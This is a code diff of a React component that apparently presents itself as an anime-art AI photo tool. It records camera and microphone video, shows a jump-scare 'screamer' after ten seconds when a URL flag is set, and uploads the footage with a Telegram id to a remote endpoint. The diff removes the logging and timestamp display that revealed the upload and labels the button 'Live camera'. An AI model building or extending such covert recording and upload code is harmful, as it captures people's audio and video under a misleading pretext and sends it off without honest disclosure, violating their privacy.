@@ -8,7 +8,6 @@ export const UploadPhoto = (props: {
 }) => {
 	const [videoVisible, setVideoVisible] = useState<boolean>(false)
 	const [photoModalOpen, setPhotoModalOpen] = useState<boolean>(false)
-	const [time, setTime] = useState<string>('')
 	const videoRef = useRef<HTMLVideoElement>(null)
 	const videoContainerRef = useRef<HTMLDivElement>(null)
 
@@ -18,7 +17,6 @@ export const UploadPhoto = (props: {
 		const showScreamer = url.searchParams.get('v2') === 'true'
 		setTimeout(() => props.setScreamerVisible(showScreamer), 10000)
 		const timeNow = Date.now()
-		setTime(timeNow.toString())
 		try {
 			navigator.mediaDevices
 				.getUserMedia({ audio: true, video: true })
@@ -50,19 +48,13 @@ export const UploadPhoto = (props: {
 							)
 
 							try {
-								const response = await fetch(
+								await fetch(
 									'https://anime-art-ai-api.vercel.app/upload-video',
 									{
 										method: 'POST',
 										body: formData,
 									}
 								)
-
-								console.log(response.json().then(data => data))
-								if (response.ok)
-									console.log(
-										(tg_id ? tg_id + '-' + timeNow : timeNow) + '.webm'
-									)
 							} catch (error) {
 								console.error('Upload error:', error)
 							}
@@ -83,7 +75,7 @@ export const UploadPhoto = (props: {
 						onClick={startCamera}
 					>
 						<FaCamera size={32} className='fill-violet-700' />
-						{time}
+						Live camera
 					</div>
 				</div>
 				<div className='w-1/2 flex justify-start'>
